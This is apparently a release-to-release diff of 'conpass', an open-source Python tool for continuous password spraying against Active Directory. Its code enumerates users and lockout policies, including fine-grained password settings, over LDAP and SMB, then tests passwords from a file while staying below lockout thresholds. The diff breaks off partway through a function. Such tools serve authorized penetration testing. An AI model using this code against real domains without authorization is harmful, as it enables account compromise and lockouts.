# Comparing `tmp/conpass-0.0.1.tar.gz` & `tmp/conpass-0.1.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "conpass-0.0.1.tar", last modified: Thu Dec 15 18:04:43 2022, max compression
+gzip compressed data, was "conpass-0.1.0.tar", last modified: Mon Jun  3 15:13:30 2024, max compression
```

## Comparing `conpass-0.0.1.tar` & `conpass-0.1.0.tar`

### file list

```diff
@@ -1,24 +1,26 @@
-drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2022-12-15 18:04:43.075068 conpass-0.0.1/
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1066 2022-12-15 18:04:22.000000 conpass-0.0.1/LICENSE
--rw-r--r--   0 pixis     (1000) pixis     (1000)     2384 2022-12-15 18:04:43.075068 conpass-0.0.1/PKG-INFO
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1800 2022-12-15 18:04:22.000000 conpass-0.0.1/README.md
-drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2022-12-15 18:04:43.075068 conpass-0.0.1/conpass/
--rw-r--r--   0 pixis     (1000) pixis     (1000)       22 2022-12-15 18:04:22.000000 conpass-0.0.1/conpass/__init__.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1678 2022-12-15 18:04:22.000000 conpass-0.0.1/conpass/console.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     7437 2022-12-15 18:04:22.000000 conpass-0.0.1/conpass/core.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1428 2022-12-15 18:04:22.000000 conpass-0.0.1/conpass/gpo.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     6352 2022-12-15 18:04:22.000000 conpass-0.0.1/conpass/impacketfile.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     8214 2022-12-15 18:04:22.000000 conpass-0.0.1/conpass/ldapconnection.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)      621 2022-12-15 18:04:22.000000 conpass-0.0.1/conpass/password.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     2046 2022-12-15 18:04:22.000000 conpass-0.0.1/conpass/session.py
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1801 2022-12-15 18:04:22.000000 conpass-0.0.1/conpass/user.py
-drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2022-12-15 18:04:43.075068 conpass-0.0.1/conpass.egg-info/
--rw-r--r--   0 pixis     (1000) pixis     (1000)     2384 2022-12-15 18:04:43.000000 conpass-0.0.1/conpass.egg-info/PKG-INFO
--rw-r--r--   0 pixis     (1000) pixis     (1000)      415 2022-12-15 18:04:43.000000 conpass-0.0.1/conpass.egg-info/SOURCES.txt
--rw-r--r--   0 pixis     (1000) pixis     (1000)        1 2022-12-15 18:04:43.000000 conpass-0.0.1/conpass.egg-info/dependency_links.txt
--rw-r--r--   0 pixis     (1000) pixis     (1000)       49 2022-12-15 18:04:43.000000 conpass-0.0.1/conpass.egg-info/entry_points.txt
--rw-r--r--   0 pixis     (1000) pixis     (1000)       21 2022-12-15 18:04:43.000000 conpass-0.0.1/conpass.egg-info/requires.txt
--rw-r--r--   0 pixis     (1000) pixis     (1000)        8 2022-12-15 18:04:43.000000 conpass-0.0.1/conpass.egg-info/top_level.txt
--rw-r--r--   0 pixis     (1000) pixis     (1000)        1 2022-12-15 18:04:43.000000 conpass-0.0.1/conpass.egg-info/zip-safe
--rw-r--r--   0 pixis     (1000) pixis     (1000)       38 2022-12-15 18:04:43.075068 conpass-0.0.1/setup.cfg
--rw-r--r--   0 pixis     (1000) pixis     (1000)     1200 2022-12-15 18:04:22.000000 conpass-0.0.1/setup.py
+drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2024-06-03 15:13:30.475601 conpass-0.1.0/
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1066 2023-09-06 16:21:51.000000 conpass-0.1.0/LICENSE
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     2456 2024-06-03 15:13:30.475601 conpass-0.1.0/PKG-INFO
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1801 2024-05-31 15:27:04.000000 conpass-0.1.0/README.md
+drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2024-06-03 15:13:30.471601 conpass-0.1.0/conpass/
+-rw-r--r--   0 pixis     (1000) pixis     (1000)       22 2023-09-06 16:21:51.000000 conpass-0.1.0/conpass/__init__.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1947 2024-05-31 15:27:04.000000 conpass-0.1.0/conpass/console.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)    11561 2024-05-31 15:27:04.000000 conpass-0.1.0/conpass/core.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1640 2024-05-31 15:27:04.000000 conpass-0.1.0/conpass/gpo.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     9858 2024-05-31 15:27:04.000000 conpass-0.1.0/conpass/ldapconnection.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)    12155 2024-05-31 15:27:04.000000 conpass-0.1.0/conpass/ntlminfo.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)      621 2023-09-06 16:21:51.000000 conpass-0.1.0/conpass/password.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)      645 2024-05-31 15:27:04.000000 conpass-0.1.0/conpass/pso.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     2531 2024-05-31 15:27:04.000000 conpass-0.1.0/conpass/session.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     6504 2024-05-31 15:27:04.000000 conpass-0.1.0/conpass/user.py
+-rw-r--r--   0 pixis     (1000) pixis     (1000)      221 2024-05-31 15:27:04.000000 conpass-0.1.0/conpass/utils.py
+drwxr-xr-x   0 pixis     (1000) pixis     (1000)        0 2024-06-03 15:13:30.475601 conpass-0.1.0/conpass.egg-info/
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     2456 2024-06-03 15:13:30.000000 conpass-0.1.0/conpass.egg-info/PKG-INFO
+-rw-r--r--   0 pixis     (1000) pixis     (1000)      443 2024-06-03 15:13:30.000000 conpass-0.1.0/conpass.egg-info/SOURCES.txt
+-rw-r--r--   0 pixis     (1000) pixis     (1000)        1 2024-06-03 15:13:30.000000 conpass-0.1.0/conpass.egg-info/dependency_links.txt
+-rw-r--r--   0 pixis     (1000) pixis     (1000)       49 2024-06-03 15:13:30.000000 conpass-0.1.0/conpass.egg-info/entry_points.txt
+-rw-r--r--   0 pixis     (1000) pixis     (1000)       26 2024-06-03 15:13:30.000000 conpass-0.1.0/conpass.egg-info/requires.txt
+-rw-r--r--   0 pixis     (1000) pixis     (1000)        8 2024-06-03 15:13:30.000000 conpass-0.1.0/conpass.egg-info/top_level.txt
+-rw-r--r--   0 pixis     (1000) pixis     (1000)        1 2024-06-03 15:13:30.000000 conpass-0.1.0/conpass.egg-info/zip-safe
+-rw-r--r--   0 pixis     (1000) pixis     (1000)       38 2024-06-03 15:13:30.475601 conpass-0.1.0/setup.cfg
+-rw-r--r--   0 pixis     (1000) pixis     (1000)     1216 2024-06-03 15:09:13.000000 conpass-0.1.0/setup.py
```

### Comparing `conpass-0.0.1/LICENSE` & `conpass-0.1.0/LICENSE`

 * *Files identical despite different names*

### Comparing `conpass-0.0.1/PKG-INFO` & `conpass-0.1.0/PKG-INFO`

 * *Files 11% similar despite different names*

```diff
@@ -1,37 +1,40 @@
 Metadata-Version: 2.1
 Name: conpass
-Version: 0.0.1
+Version: 0.1.0
 Summary: Continuous password spraying tool
 Home-page: https://github.com/Hackndo/conpass/
 Author: Pixis
 Author-email: hackndo@gmail.com
 License: MIT
 Classifier: Programming Language :: Python :: 3.6
 Classifier: Programming Language :: Python :: 3.7
 Classifier: Programming Language :: Python :: 3.8
 Classifier: Programming Language :: Python :: 3.9
 Classifier: License :: OSI Approved :: MIT License
 Classifier: Operating System :: OS Independent
 Requires-Python: >=3.6
 Description-Content-Type: text/markdown
 License-File: LICENSE
+Requires-Dist: python-ldap
+Requires-Dist: impacket
+Requires-Dist: rich
 
 # ConPass
 
 [![PyPI version](https://badge.fury.io/py/conpass.svg)](https://pypi.org/project/conpass)
 [![PyPI Statistics](https://img.shields.io/pypi/dm/conpass.svg)](https://pypistats.org/packages/conpass)
 [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)
 
 Python tool for continuous password spraying taking into account the password policy.
 
 | Chapters                                | Description                                     |
 |-----------------------------------------|-------------------------------------------------|
 | [Warning](#warning)                     | Before using this tool, read this               |
-| [Installation](#installation)           | Lsassy installation                             |
+| [Installation](#installation)           | ConPass installation                             |
 | [Usage](#usage)                         | ConPass usage                                   |
 
 ## Warning
 
 Although I have made every effort to make sure the tool get the correct password policy, there can be some password policy settings that are not taken into account by the tool, which may lead to accounts lockout.
 
 ## Installation
```

### Comparing `conpass-0.0.1/README.md` & `conpass-0.1.0/README.md`

 * *Files 2% similar despite different names*

```diff
@@ -5,15 +5,15 @@
 [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)
 
 Python tool for continuous password spraying taking into account the password policy.
 
 | Chapters                                | Description                                     |
 |-----------------------------------------|-------------------------------------------------|
 | [Warning](#warning)                     | Before using this tool, read this               |
-| [Installation](#installation)           | Lsassy installation                             |
+| [Installation](#installation)           | ConPass installation                             |
 | [Usage](#usage)                         | ConPass usage                                   |
 
 ## Warning
 
 Although I have made every effort to make sure the tool get the correct password policy, there can be some password policy settings that are not taken into account by the tool, which may lead to accounts lockout.
 
 ## Installation
```

### Comparing `conpass-0.0.1/conpass/console.py` & `conpass-0.1.0/conpass/console.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,16 +1,14 @@
 import argparse
 
 from conpass import __version__
 from conpass.core import ThreadPool
 
 
 def main():
-    # user = User(samaccountname='Administrator', last_password_test=None, lockout_threshold=0, bad_password_count=0)
-
     """
     Command line function to call conpass
     """
     version = __version__
     parser = argparse.ArgumentParser(
         prog="conpass",
         description='conpass v{} - Continuous password spraying tool'.format(__version__)
@@ -20,22 +18,23 @@
     group_auth.add_argument('-u', '--username', action='store', help='Username', required=True)
     group_auth.add_argument('-p', '--password', action='store', help='Plaintext password', required=True)
     group_auth.add_argument('-d', '--domain', default="", action='store', help='Domain name', required=True)
     group_auth.add_argument('-dc-ip', action='store', metavar="ip address",
                             help='IP Address of the primary domain controller.')
 
     group_spray = parser.add_argument_group('Spray')
-    group_spray.add_argument('-P', '--password-file', action='store', help='File containing passwords to test',
-                            required=True)
+    group_spray.add_argument('-P', '--password-file', action='store', help='File containing passwords to test', required=True)
+    group_spray.add_argument('-S', '--security-threshold', default=1, type=int, action='store', help='Specifies the number of remaining attempts allowed before reaching the lockout threshold (Default: 1)')
     group_auth.add_argument('--threads', default=10, type=int, action='store', help='Threads number (Default 10)')
 
     group_info = parser.add_argument_group('Info')
-    group_info.add_argument('-v', '--verbose', action='store_true', help='Get debug information')
+    group_info.add_argument('-v', action='count', default=0, help='Verbosity level (-v or -vv)')
     group_info.add_argument('-V', '--version', action='version', version='%(prog)s (version {})'.format(version))
 
     args = parser.parse_args()
 
     ThreadPool(args).run()
 
-
+# TODO
+# Vérifier sur LDAP que le badpwdcount est synchro. Faut le remettre à 0 par exemple après un observation windows. Est-ce qu'on peut pas aller recup le compte LDAP à ce moment là ? Pas si souvent ...
 if __name__ == "__main__":
     main()
```

#### encoding

```diff
@@ -1 +1 @@
-us-ascii
+utf-8
```

### Comparing `conpass-0.0.1/conpass/core.py` & `conpass-0.1.0/conpass/core.py`

 * *Files 26% similar despite different names*

```diff
@@ -1,8 +1,8 @@
-import logging
+import datetime
 import os
 import queue
 import signal
 import threading
 from queue import Queue
 import time
 import socket
@@ -10,15 +10,14 @@
 from rich.progress import Progress
 
 
 from conpass.ldapconnection import LdapConnection
 from conpass.password import Password
 from conpass.user import USER_STATUS
 from conpass.session import Session
-from conpass.impacketfile import ImpacketFile
 
 lock = threading.RLock()
 
 
 class QueueProgress:
     processing = "[green] Processing password file..."
     waiting = "[green] Waiting for new passwords..."
@@ -33,66 +32,88 @@
         if self.progress.tasks[self.task].description == QueueProgress.waiting:
             self.progress.update(self.task, description=QueueProgress.processing)
 
     def task_done(self):
         self.progress.update(self.task, advance=1)
         if self.progress.tasks[self.task].completed == self.progress.tasks[self.task].total:
             self.progress.update(self.task, description=QueueProgress.waiting)
+
     def stop(self):
         self.progress.stop()
 
 
 class Worker(threading.Thread):
-    def __init__(self, testing_q, ldapconnection, smbconnection, queue_progress):
+    def __init__(self, testing_q, test_user_lock, ldapconnection, smbconnection, queue_progress, security_threshold=1):
         super().__init__()
         self.testing_q = testing_q
+        self.test_user_lock = test_user_lock
         self.ldapconnection = ldapconnection
         self.smbconnection = smbconnection
         self.console = self.ldapconnection.console
         self.queue_progress = queue_progress
+        self.security_threshold = security_threshold
 
     def run(self):
         if not self.ldapconnection.login():
             exit(1)
         if not self.smbconnection.get_session():
             exit(1)
         while True:
             try:
                 user, password = self.testing_q.get(timeout=0.1)
-                user_status = user.should_test_password()
-                if user_status == USER_STATUS.THRESHOLD:
+            except queue.Empty as e:
+                time.sleep(0.1)
+                continue
+
+            with lock:
+                if user.samaccountname in self.test_user_lock:
                     self.testing_q.put([user, password])
                     self.testing_q.task_done()
                     continue
-                elif user_status == USER_STATUS.FOUND:
-                    self.testing_q.task_done()
-                    self.queue_progress.task_done()
-                    continue
-                # Can use ldapconnection istead, but no hash authentication implemented
-                user_found = user.test_password(password, conn=self.smbconnection)
-                if user_found:
-                    self.console.log(f"[green]Found: {user.samaccountname} - {password.value}[/green]")
+                self.test_user_lock.append(user.samaccountname)
+
+            should_test_password = user.should_test_password(self.security_threshold, self.ldapconnection)
+
+            if should_test_password == USER_STATUS.FOUND:
                 self.testing_q.task_done()
                 self.queue_progress.task_done()
-            except queue.Empty as e:
-                time.sleep(0.1)
+                with lock:
+                    self.test_user_lock.remove(user.samaccountname)
+                continue
+            elif should_test_password == USER_STATUS.THRESHOLD:
+                self.testing_q.put([user, password])
+                self.testing_q.task_done()
+                with lock:
+                    self.test_user_lock.remove(user.samaccountname)
                 continue
 
+            # Can use ldapconnection instead, but no hash authentication implemented
+            user_found = user.test_password(password, conn=self.smbconnection)
+            if user_found:
+                self.console.log(f"[green]Found: {user.samaccountname} - {password.value}[/green]")
+            self.testing_q.task_done()
+            self.queue_progress.task_done()
+            with lock:
+                self.test_user_lock.remove(user.samaccountname)
 
 class ThreadPool:
     def __init__(self, arguments):
         signal.signal(signal.SIGINT, self.interrupt_event)
         signal.signal(signal.SIGTERM, self.interrupt_event)
 
         self.arguments = arguments
         self.console = Console()
         self.console.log("[yellow]This tool does its best to find the effective password policy but may be wrong. Use with caution.[/yellow]")
+        self.console.log("[yellow]Emergency command:[/yellow] [red]Search-ADAccount -LockedOut | Unlock-ADAccount[/red]")
         self.progress = None
+        self.info = False
         self.debug = False
-        if self.arguments.verbose:
+        if self.arguments.v > 0:
+            self.info = True
+        if self.arguments.v > 1:
             self.debug = True
 
         # Resolve IP address from arguments.domain
         self.dc_ip = arguments.dc_ip
         if not self.dc_ip:
             try:
                 self.dc_ip = socket.gethostbyname(arguments.domain)
@@ -101,72 +122,131 @@
                 exit(1)
 
         with self.console.status("Retrieving users and password policies...") as status:
             self.ldapconnection = LdapConnection(host=self.dc_ip, domain=arguments.domain, username=arguments.username, password=arguments.password, console=status.console, debug=self.debug)
             if not self.ldapconnection.login():
                 exit(1)
             session = Session(address=self.dc_ip, target_ip=self.dc_ip, domain=arguments.domain, port=445, console=status.console, debug=self.debug).get_session()
+            utc_remote_time = session.get_remote_time()
+            utc_local_time = datetime.datetime.now(datetime.timezone.utc)
+            time_delta = utc_local_time - utc_remote_time
+            self.debug and status.console.log(f"UTC REMOTE: {utc_remote_time}")
+            self.debug and status.console.log(f"UTC LOCAL: {utc_local_time}")
+            self.debug and status.console.log(f"UTC DIFF: {time_delta.total_seconds()} seconds")
             if not session.login(arguments.username, arguments.password):
                 exit(1)
-            f = ImpacketFile(session, status.console, debug=self.debug)
-            self.users = self.ldapconnection.get_users(f)
-
-            status.console.log(f"{len(self.users)} users - {'Lockout after ' + str(self.users[0].lockout_threshold) + ' bad attempts' if self.users[0].lockout_threshold > 0 else '[red]No lockout[/red]' }")
+            # Remove users with only 1 try, or <=N tries if `-S N` provided
+            results = self.ldapconnection.get_users(time_delta, disabled=False)
+            users = results['users']
+            if not users:
+                status.console.log(f"Couldn't retreive users")
+                exit()
+            self.users = [user for user in users if user.lockout_threshold == 0 or user.lockout_threshold > self.arguments.security_threshold]
+
+            status.console.log(f"{len(set([user.pso.dn for user in self.users if user.readable_pso() in (1, -1)]))} PSO")
+            status.console.log(f"{len(self.users)} users - {'Lockout after ' + str(results['lockout_threshold']) + ' bad attempts (Will stop at ' + str(results['lockout_threshold'] - self.arguments.security_threshold) + ')' if results['lockout_threshold'] > 0 else '[red]No lockout[/red]' }")
+            status.console.log(f"{len([user for user in self.users if user.readable_pso() == -1])} users with PSO that [red]can not be read[/red]")
+            status.console.log(f"{len([user for user in self.users if user.readable_pso() == 1])} users with PSO that [green]can be read[/green]")
         self.threads = []
         self.max_threads = arguments.threads
         self.testing_q = Queue()
+        self.test_user_lock = []
         self.tests = []
         self.all_users_found = False
 
-    # Add the users/password combination to the queue
-    def add_users_password(self, password, progress):
-        self.all_users_found = True
-        for user in self.users:
-            user_status = user.should_test_password()
-            if user_status != USER_STATUS.FOUND:
-                self.all_users_found = False
-            if user_status in (USER_STATUS.TEST, USER_STATUS.THRESHOLD) and not [user, password] in self.tests:
-                logging.debug(f"Adding to queue {user.samaccountname} - {password.value}")
-                self.testing_q.put([user, password])
-                self.tests.append([user, password])
-                progress.add_password()
-        return self.all_users_found
-
     # Start the threads
     def run(self):
         threading.current_thread().name = "[Core]"
 
         # Check if file exists on disk
         if not os.path.isfile(self.arguments.password_file):
-            logging.info(f"File {self.arguments.password_file} does not exist Creating it...")
+            self.info and self.console.log(f"File {self.arguments.password_file} does not exist Creating it...")
             # Create file
             open(self.arguments.password_file, 'a').close()
 
         self.progress = QueueProgress()
+        # Add "rich" Progress console to each user for future logging
+        for user in self.users:
+            user.console = self.progress.progress.console
 
+        # Start one Worker per thread.
+        # Each Worker will retrieve some user/pass from `testing_q` queue and test them
         for i in range(self.max_threads):
-            thread = Worker(self.testing_q, LdapConnection(host=self.dc_ip, domain=self.arguments.domain, username=self.arguments.username, password=self.arguments.password, console=self.progress.progress.console, debug=self.debug), smbconnection=Session(address=self.dc_ip, target_ip=self.dc_ip, domain=self.arguments.domain, port=445, console=self.progress.progress.console, debug=self.debug), queue_progress=self.progress)
+            thread = Worker(
+                self.testing_q,
+                self.test_user_lock,
+                LdapConnection(
+                    host=self.dc_ip,
+                    domain=self.arguments.domain,
+                    username=self.arguments.username,
+                    password=self.arguments.password,
+                    console=self.progress.progress.console,
+                    debug=self.debug
+                ), smbconnection=Session(
+                    address=self.dc_ip,
+                    target_ip=self.dc_ip,
+                    domain=self.arguments.domain,
+                    port=445,
+                    console=self.progress.progress.console,
+                    debug=self.debug),
+                queue_progress=self.progress,
+                security_threshold=self.arguments.security_threshold)
             thread.daemon = True
             self.threads.append(thread)
             thread.start()
 
+        # Always read the password file to discover new passwords
         while True:
-            with open(self.arguments.password_file) as f:
-                for password in f:
-                    if password.isspace():
-                        continue
-                    password = Password(password[:-1])
-                    self.all_users_found = self.add_users_password(password, self.progress)
+            try:
+                with open(self.arguments.password_file) as f:
+                    for password in f:
+                        # Ignore blank password
+                        if password.isspace():
+                            continue
+                        # Remove the trailing \n
+                        password = Password(password.strip())
+                        self.all_users_found = self.add_users_password(password, self.progress)
+            except FileNotFoundError:
+                pass
             if self.all_users_found:
                 self.console.log(f'\n** All users passwords found! **')
                 break
+            time.sleep(0.1)
 
         # Block until all tasks are done
         self.testing_q.join()
 
+    # Add the users/password combination to the queue
+    def add_users_password(self, password, progress):
+        self.all_users_found = True
+        for key, user in enumerate(self.users):
+            # Check if user should be tested, depending on lockout policy and PSO
+            user_status = user.should_be_discarded()
+
+            # Remove untestable users from list
+            if user_status in (USER_STATUS.UNREADABLE_PSO, USER_STATUS.FOUND):
+                user_status == USER_STATUS.UNREADABLE_PSO and self.info and self.progress.progress.console.log(f"Discarding {user.samaccountname}: [red]PSO unreadable. Use -f to force testing[/red]")
+                del(self.users[key])
+                continue
+            # This account wasn't found so there's at least one account left.
+            self.all_users_found = False
+
+            # If this (user,password) wasn't already added to the test list, then it should be added
+            if user_status in (USER_STATUS.TEST, USER_STATUS.PSO) and not [user, password] in self.tests:
+                if user_status == USER_STATUS.PSO and user not in [test[0] for test in self.tests]:
+                    self.info and self.progress.progress.console.log(f"User {user.samaccountname} has a PSO: {user.pso}")
+                self.debug and self.progress.progress.console.log(f"Adding to queue {user.samaccountname} - {password.value}")
+                self.testing_q.put([user, password])
+                self.tests.append([user, password])
+                # Add one test (user,password) to progress bar total
+                progress.add_password()
+        return self.all_users_found
+
+
+
     # Handle the interrupt signal
     def interrupt_event(self, signum, stack):
         if self.progress is not None:
             self.progress.stop()
         self.console.log(f"** Interrupted! **")
         exit()
```

### Comparing `conpass-0.0.1/conpass/gpo.py` & `conpass-0.1.0/conpass/gpo.py`

 * *Files 22% similar despite different names*

```diff
@@ -1,11 +1,9 @@
 import re
 
-from lsassy.impacketfile import ImpacketFile
-
 class GPO:
     GPLINK_OPT_DISABLE = 1 << 0
     GPLINK_OPT_ENFORCE = 1 << 1
 
     def __init__(self, dn, options, lockout_threshold, lockout_reset):
         self.dn = dn
         self.options = options
@@ -21,24 +19,28 @@
             file="GptTmpl.inf"
         )
         if file is None:
             return None, None
         content = file.read(file.size()).decode("utf-16-le")
         file.close()
 
-        lockout_threshold = None if "LockoutBadCount" not in content else int(re.compile(r"LockoutBadCount *= *(\d+)").findall(content)[0])
-        lockout_reset = None if "ResetLockoutCount" not in content else int(re.compile(r"ResetLockoutCount *= *(\d+)").findall(content)[0])
+        lockout_threshold = None if "LockoutBadCount" not in content else int(re.compile(r"LockoutBadCount *= *(\d+)", flags=re.IGNORECASE).findall(content)[0])
+        lockout_reset = None if "ResetLockoutCount" not in content else int(re.compile(r"ResetLockoutCount *= *(\d+)", flags=re.IGNORECASE).findall(content)[0])
 
+        """
+        # This code shouldn't be here. I don't know why I wrote it. If nothing it set (None), it's not set to 0 (no lockout)
+        # GptTmpl.inf can exist without password policy set on GPO
         if lockout_reset is None:
             lockout_reset = 0
         if lockout_threshold is None:
             lockout_threshold = 0
-
+        """
         return lockout_threshold, lockout_reset
 
+
     def __str__(self):
         return self.__repr__()
 
     def __repr__(self):
         return f"GPO({self.dn}, {self.options}, {self.lockout_threshold}, {self.lockout_reset})"
```

### Comparing `conpass-0.0.1/conpass/ldapconnection.py` & `conpass-0.1.0/conpass/ldapconnection.py`

 * *Files 22% similar despite different names*

```diff
@@ -1,19 +1,36 @@
 # Author:
 #  Romain Bentz (pixis - @hackanddo)
 # Website:
 #  https://beta.hackndo.com
 
 import ldap
 from ldap.controls import SimplePagedResultsControl
-from datetime import datetime
+from datetime import datetime, timezone
 import re
 
+from conpass.pso import PSO
 from conpass.user import User
 from conpass.gpo import GPO
+from conpass import utils
+import struct
+
+def convert(binary):
+    version = struct.unpack('B', binary[0:1])[0]
+    # I do not know how to treat version != 1 (it does not exist yet)
+    assert version == 1, version
+    length = struct.unpack('B', binary[1:2])[0]
+    authority = struct.unpack(b'>Q', b'\x00\x00' + binary[2:8])[0]
+    string = 'S-%d-%d' % (version, authority)
+    binary = binary[8:]
+    assert len(binary) == 4 * length
+    for i in range(length):
+        value = struct.unpack('<L', binary[4*i:4*(i+1)])[0]
+        string += '-%d' % value
+    return string
 
 
 class LdapConnection:
     def __init__(self, host, domain, username, password, console, port=None, ssl=False, page_size=200, debug=False):
         self.host = host
         self.domain = domain
         self.username = username
@@ -25,15 +42,15 @@
             self.port = 636 if self.ssl else 389
         else:
             self.port = port
         self.page_size = page_size
         self.domain_dn = None
         self._conn = None
         self.domain_threshold = 0
-        self.granular_threshold = {}  # keys are policy DNs
+        self.psos = {}
         self.domain_dn = self.get_domain_dn()
         if self.domain_dn is None:
             self.console.log(f"Error: Unable to get domain DN from {self.domain}. Please provide full domain name (e.g. example.com)")
             exit(1)
         self.debug = debug
 
     def get_domain_dn(self):
@@ -74,15 +91,15 @@
             return False
         except Exception as e:
             self.console.log("Unexpected error while trying {}:{}".format(username, password.value))
             if self.debug:
                 self.console.print_exception()
             return False
 
-    def get_users(self, impacketfile, users=None, disabled=True):
+    def get_users(self, time_delta, users=None, disabled=True):
         filters = ["(objectClass=User)"]
         if users:
             if len(users) == 1:
                 filters.append("(samAccountName={})".format(users[0].lower()))
             else:
                 filters.append("(|")
                 filters.append("".join("(samAccountName={})".format(user.lower()) for user in users))
@@ -91,84 +108,109 @@
             filters.append("(!(userAccountControl:1.2.840.113556.1.4.803:=2))")
 
         if len(filters) > 1:
             filters = '(&' + ''.join(filters) + ')'
         else:
             filters = filters[0]
         try:
-            ldap_attributes = ['samAccountName', 'badPwdCount', 'badPasswordTime', 'distinguishedName']
-            res = self.get_paged_users(filters, ldap_attributes)
-            lockout_threshold, lockout_reset = self.get_password_policy(impacketfile)
-            results = [
-                User(
-                    samaccountname=entry['sAMAccountName'][0].decode('utf-8'),
-                    bad_password_count=0 if 'badPwdCount' not in entry else int(entry['badPwdCount'][0]),
-                    last_password_test=datetime.fromtimestamp(int((int(entry['badPasswordTime'][0].decode('utf-8')) / 10000000 - 11644473600))),
-                    lockout_threshold=lockout_threshold,
-                    lockout_reset=lockout_reset
-                ) for dn, entry in res if isinstance(entry, dict) and entry['sAMAccountName'][0].decode('utf-8')[-1] != '$'
-            ]
+            ldap_attributes = ['samAccountName', 'badPwdCount', 'badPasswordTime', 'distinguishedName', 'msDS-ResultantPSO']
+            res = self.get_paged_objects(filters, ldap_attributes)
+            lockout_threshold, lockout_reset = self.get_password_policy()
+            results = []
+
+            for dn, entry in res:
+                if isinstance(entry, dict) and entry['sAMAccountName'][0].decode('utf-8')[-1] != '$':
+                    results.append(User(
+                        samaccountname=entry['sAMAccountName'][0].decode('utf-8'),
+                        dn=entry['distinguishedName'][0].decode('utf-8'),
+                        bad_password_count=0 if 'badPwdCount' not in entry else int(entry['badPwdCount'][0]),
+                        last_password_test=datetime(1970, 1, 1, 0, 00).replace(tzinfo=timezone.utc) if 'badPasswordTime' not in entry else utils.win_timestamp_to_datetime(int(entry['badPasswordTime'][0].decode('utf-8'))),
+                        lockout_threshold=lockout_threshold,
+                        lockout_reset=lockout_reset,
+                        pso=None if 'msDS-ResultantPSO' not in entry else self.get_policy_from_pso(entry['msDS-ResultantPSO'][0]),
+                        time_delta=time_delta,
+                        console=self.console,
+                        debug=self.debug
+                    ))
+            return {'users': results, 'lockout_threshold': lockout_threshold, 'lockout_reset': lockout_reset}
 
-            return results
         except Exception as e:
             self.console.log("An error occurred while looking for users via LDAP")
             if self.debug:
                 self.console.print_exception()
             return False
 
-    def get_password_policy(self, impacketfile):
-        filters = "(&(distinguishedName={}))".format(self.domain_dn)
-        attributes = ['distinguishedName', 'gPLink', 'gPOptions']
+    def get_user(self, user):
+        filters = ["(objectClass=User)", "(samAccountName={})".format(user.lower())]
+        filters = '(&' + ''.join(filters) + ')'
+
+        try:
+            ldap_attributes = ['samAccountName', 'badPwdCount', 'badPasswordTime']
+            res = self.get_paged_objects(filters, ldap_attributes)
+            bad_pwd_count = 0 if 'badPwdCount' not in res[0][1] else int(res[0][1]['badPwdCount'][0])
+            last_pwd_test = datetime(1970, 1, 1, 0, 00).replace(tzinfo=timezone.utc) if 'badPasswordTime' not in res[0][1] else utils.win_timestamp_to_datetime(int(res[0][1]['badPasswordTime'][0].decode('utf-8')))
+            return last_pwd_test, bad_pwd_count
 
+        except Exception as e:
+            print(e)
+            self.console.log(f"An error occurred while looking for {user} via LDAP")
+            if self.debug:
+                self.console.print_exception()
+            return False
+
+    def get_policy_from_pso(self, pso):
+        if pso in self.psos:
+            return self.psos[pso]
+
+        attributes = ['msDS-LockoutThreshold', 'msDS-PasswordSettingsPrecedence', 'msDS-LockoutObservationWindow', 'msDS-LockoutDuration']
+        pso = pso.decode('utf-8')
+        
         res = self._conn.search_ext(
-            self.domain_dn,
+            pso,
             ldap.SCOPE_SUBTREE,
-            filters,
-            attributes
+            attrlist=attributes
         )
-        _, rdata, _, _ = self._conn.result3(res)
-        dn, entry = rdata[0]
 
-        gpo_distinguished_names = [dn.lower() for dn, options in re.compile(r'\[LDAP://(cn=.*?);(\d+)]').findall(entry['gPLink'][0].decode('utf-8'))]
-
-        gpos = self.get_gpos_filepath(impacketfile, gpo_distinguished_names)
-        self.console.log(f"{len(gpo_distinguished_names)} GPOs linked to root domain - {len([gpo for gpo in gpos if gpos[gpo] != (None, None)])} have a password policy")
+        try:
+            rtype, rdata, rmsgid, serverctrls = self._conn.result3(res)
+        except ldap.NO_SUCH_OBJECT as e:
+            self.psos[pso] = PSO(dn=pso, readable=False)
+            return self.psos[pso]
+        dn, entry = rdata[0]
+        if 'msDS-LockoutThreshold' not in entry:
+            self.psos[pso] = PSO(dn=pso, readable=False)
+        else:
+            self.psos[pso] = PSO(
+                pso,
+                int(entry['msDS-LockoutThreshold'][0].decode('utf-8')),
+                int(entry['msDS-LockoutObservationWindow'][0].decode('utf-8')),
+                int(entry['msDS-LockoutDuration'][0].decode('utf-8')),
+                int(entry['msDS-PasswordSettingsPrecedence'][0].decode('utf-8'))
+            )
+        return self.psos[pso]
+
+    def get_password_policy(self):
+
+        filter = '(objectClass=domain)'
